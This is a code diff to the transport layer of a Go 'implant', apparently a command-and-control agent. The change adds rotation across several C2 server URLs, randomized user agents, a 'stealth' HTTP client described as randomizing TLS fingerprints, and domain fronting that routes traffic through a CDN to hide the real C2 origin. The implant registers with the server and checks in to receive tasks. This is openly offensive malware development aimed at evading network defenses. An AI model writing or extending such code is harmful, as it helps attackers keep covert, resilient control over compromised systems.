@@ -3,7 +3,6 @@ package implant
 import (
 	"bytes"
 	"crypto/rsa"
-	"crypto/tls"
 	"encoding/json"
 	"io"
 	"net/http"
@@ -15,29 +14,40 @@ import (
 
 // Transport handles HTTP(S) communication with the C2 server.
 type Transport struct {
-	serverURL  string
-	client     *http.Client
-	sessionKey []byte
-	serverPub  *rsa.PublicKey
-	agentID    string
-	agentName  string
-	userAgent  string
+	serverURLs    []string
+	currentURLIdx int
+	client        *http.Client
+	sessionKey    []byte
+	serverPub     *rsa.PublicKey
+	agentID       string
+	agentName     string
+	userAgent     string
 }
 
-// NewTransport creates a new HTTP transport.
-func NewTransport(serverURL string, serverPub *rsa.PublicKey) *Transport {
+// NewTransport creates a new HTTP transport supporting multiple C2 URLs for failover.
+// Uses StealthHTTPClient for JA3 randomization, proxy-awareness, and optional domain fronting.
+func NewTransport(serverURLs []string, serverPub *rsa.PublicKey) *Transport {
 	return &Transport{
-		serverURL: serverURL,
-		serverPub: serverPub,
-		userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-		client: &http.Client{
-			Timeout: 30 * time.Second,
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{
-					InsecureSkipVerify: true, // Accept self-signed certs
-				},
-			},
-		},
+		serverURLs:    serverURLs,
+		currentURLIdx: 0,
+		serverPub:     serverPub,
+		userAgent:     RandomUserAgent(),
+		client:        StealthHTTPClient(),
+	}
+}
+
+// currentURL returns the active C2 URL.
+func (t *Transport) currentURL() string {
+	if len(t.serverURLs) == 0 {
+		return ""
+	}
+	return t.serverURLs[t.currentURLIdx]
+}
+
+// nextURL rotates to the next C2 URL in the list (wraps around).
+func (t *Transport) nextURL() {
+	if len(t.serverURLs) > 0 {
+		t.currentURLIdx = (t.currentURLIdx + 1) % len(t.serverURLs)
 	}
 }
 
@@ -81,6 +91,7 @@ func (t *Transport) Register(sysinfo SysInfo) error {
 	// Send HTTP request
 	respBody, err := t.sendEnvelope("/api/v1/auth", env)
 	if err != nil {
+		t.nextURL() // rotate to next C2 URL for next attempt
 		return err
 	}
 
@@ -131,6 +142,7 @@ func (t *Transport) CheckIn(results []protocol.TaskResult) ([]protocol.Task, err
 	// Send
 	respBody, err := t.sendEnvelope("/api/v1/status", env)
 	if err != nil {
+		t.nextURL() // rotate to next C2 URL for next attempt
 		return nil, err
 	}
 
@@ -161,7 +173,7 @@ func (t *Transport) sendEnvelope(path string, env *protocol.Envelope) ([]byte, e
 		return nil, err
 	}
 
-	url := t.serverURL + path
+	url := t.currentURL() + path
 	req, err := http.NewRequest("POST", url, bytes.NewReader(httpBody))
 	if err != nil {
 		return nil, err
@@ -169,6 +181,12 @@ func (t *Transport) sendEnvelope(path string, env *protocol.Envelope) ([]byte, e
 
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", t.userAgent)
+
+	// Domain fronting: override the HTTP Host header so the CDN routes the
+	// request to the real C2 origin while the TLS SNI points at the CDN host.
+	if HostHeader != "" {
+		req.Host = HostHeader
+	}
 
 	resp, err := t.client.Do(req)
 	if err != nil {
